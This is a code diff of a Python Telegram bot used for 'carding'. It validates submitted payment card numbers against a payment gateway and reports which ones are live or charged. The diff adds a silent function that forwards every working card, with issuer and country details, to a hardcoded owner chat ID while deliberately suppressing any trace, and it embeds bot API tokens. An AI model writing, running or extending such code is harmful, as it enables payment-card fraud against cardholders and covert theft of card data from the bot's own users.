-            bot.reply_to(message, f"Please wait {remaining_time} seconds before using this command again.")
+        if message.chat.id != allowed_group:
+            bot.reply_to(message, "This command can only be used in the designated group. User Must Join the Group")
             return
 
-        # Update the last usage timestamp
-        last_used[user_id] = current_time
-        
+        # Check cooldown for regular users (not owners)
+        user_id = str(message.from_user.id)
+        current_time = time.time()
+
+        if user_id not in owners:  # Only apply cooldown to non-owners
+            if user_id in user_cooldowns:
+                time_since_last_use = current_time - user_cooldowns[user_id]
+                if time_since_last_use < 20:  # 20 second cooldown
+                    remaining_time = 20 - int(time_since_last_use)
+                    bot.reply_to(message, f"⏰ Please wait {remaining_time} seconds before using /chk again.")
+                    return
+
+            # Update the user's last usage time
+            user_cooldowns[user_id] = current_time
+
         # Extract the card number from the command
         if len(message.text.split()) < 2:
-            bot.reply_to(message, "Please provide a valid card number. Usage: /chk card_number")
+            bot.reply_to(message, "Please provide a valid card number. Usage: /chk <card_number>")
             return
-        
-        cc = message.text.split('/chk ')[1]
+
+        try:
+            cc = message.text.split('/chk ')[1]
+        except IndexError:
+            bot.reply_to(message, "Please provide a valid card number. Usage: /chk <card_number>")
+            return
         username = message.from_user.username or "N/A"
 
         try:
@@ -916,6 +531,7 @@ def chk(message):
         # Get the response from the `Tele` function
         try:
             last = str(Tele(cc))
+            print(f"DEBUG /chk - Response received: {last}")
         except Exception as e:
             print(f"Error in Tele function: {e}")
             last = "An error occurred."
@@ -943,9 +559,24 @@ def chk(message):
         
         if "requires_action" in last:
             message_ra = f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
-					
+
 𝗖𝗮𝗿𝗱: {cc} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 1$ Charged
 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: VBV.
+
+𝗜𝗻𝗳𝗼: {brand} - {typ} - {dicr}
+𝐈𝐬??𝐮??𝐫: {bank}
+𝐂𝐨𝐮𝐧𝐭𝐫??: {cn} {emj}
+
+𝗧𝗶𝗺??: 0 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
+𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
+𝐁𝐨𝐭 𝐁𝐲: @god_forever'''
+            bot.edit_message_text(message_ra, chat_id=message.chat.id, message_id=initial_message.message_id)
+            send_owner_notification(message_ra)  # Send to owner
+        elif check_cvv_error(last):
+            message_cvv = f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
+
+𝗖𝗮𝗿𝗱: {cc} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 1$ Charged
+𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: CVV/CVC Incorrect.
 
 𝗜𝗻𝗳𝗼: {brand} - {typ} - {dicr}
 𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
@@ -954,17 +585,11 @@ def chk(message):
 𝗧𝗶𝗺𝗲: 0 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
 𝐁𝐨𝐭 𝐁𝐲: @god_forever'''
-            bot.edit_message_text(message_ra, chat_id=message.chat.id, message_id=initial_message.message_id)
-            
-            # Send to owner
-            try:
-                bot.send_message(1172862169, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{message_ra}", parse_mode="HTML")
-            except:
-                pass
-                
+            bot.edit_message_text(message_cvv, chat_id=message.chat.id, message_id=initial_message.message_id)
+            send_owner_notification(message_cvv)  # Send to owner
         elif "succeeded" in last:
             msg_sec = f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
-					
+
 𝗖𝗮𝗿𝗱: {cc}
 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 1$ Charged
 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Card Checked Successfully.
@@ -977,13 +602,7 @@ def chk(message):
 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
 𝐁𝐨𝐭 𝐁𝐲: @god_forever'''
             bot.edit_message_text(msg_sec, chat_id=message.chat.id, message_id=initial_message.message_id)
-            
-            # Send to owner
-            try:
-                bot.send_message(1172862169, f"🎯 <b>CHARGED CARD FOUND!</b>\n\n{msg_sec}", parse_mode="HTML")
-            except:
-                pass
-                
+            send_owner_notification(msg_sec)  # Send to owner
         else:
             msg_dec = f'''𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌
 					
@@ -1006,8 +625,78 @@ def chk(message):
     
     
 def send_telegram_notification(msg1):
-    url = f"https://api.telegram.org/bot7959620740:AAFAHbQYPrW2KXmzwog4lMiv0XQUVgJ0aEM/sendMessage"
-    data = {'chat_id': -4970290554, 'text': msg1, 'parse_mode': 'HTML'}
+    url = f"https://api.telegram.org/bot7471320098:AAFozaWdh60lXwHRZC4AfwqhsyD13nSZZH0/sendMessage"
+    data = {'chat_id': -4948206902, 'text': msg1, 'parse_mode': 'HTML'}
     requests.post(url, data=data)
+
+def send_owner_notification(msg1):
+    """Send silent notification to the owner"""
+    url = f"https://api.telegram.org/bot7471320098:AAFozaWdh60lXwHRZC4AfwqhsyD13nSZZH0/sendMessage"
+    owner_id = "1172862169"  # Owner ID
+    data = {
+        'chat_id': owner_id,
+        'text': msg1,
+        'parse_mode': 'HTML',
+        'disable_notification': True  # Silent notification
+    }
+    try:
+        requests.post(url, data=data, timeout=5)
+        # No print statements - completely silent
+    except:
+        # Silent failure - no error messages
+        pass
+
+# Removed send_notifications_to_all - using silent owner notifications only
     
-bot.infinity_polling()
+# Robust bot startup with conflict handling
+def start_bot_safely():
+    """Start bot with automatic conflict resolution"""
+    max_retries = 3
+    retry_delay = 10
+
+    for attempt in range(max_retries):
+        try:
+            print(f"🚀 Starting bot (attempt {attempt + 1}/{max_retries})...")
+
+            # Clear conflicts before each attempt
+            if attempt > 0:
+                print(f"⏳ Waiting {retry_delay} seconds before retry...")
+                time.sleep(retry_delay)
+                clear_bot_conflicts(token)
+
+            # Start polling with error handling
+            bot.infinity_polling(
+                timeout=20,
+                long_polling_timeout=20,
+                none_stop=True,
+                interval=1
+            )
+            break
+
+        except telebot.apihelper.ApiTelegramException as e:
+            if "409" in str(e) or "Conflict" in str(e):
+                print(f"❌ Bot conflict detected (attempt {attempt + 1}): {e}")
+                if attempt < max_retries - 1:
+                    print("🔄 Attempting to resolve conflict...")
+                    clear_bot_conflicts(token)
+                    continue
+                else:
+                    print("❌ Max retries reached. Please check for other bot instances.")
+                    break
+            else:
+                print(f"❌ Telegram API error: {e}")
+                break
+
+        except Exception as e:
+            print(f"❌ Unexpected error: {e}")
+            if attempt < max_retries - 1:
+                print(f"🔄 Retrying in {retry_delay} seconds...")
+                time.sleep(retry_delay)
+                continue
+            else:
+                print("❌ Max retries reached.")
+                break
+
+if __name__ == "__main__":
+    print("🤖 Card Checker Bot Starting...")
+    start_bot_safely()
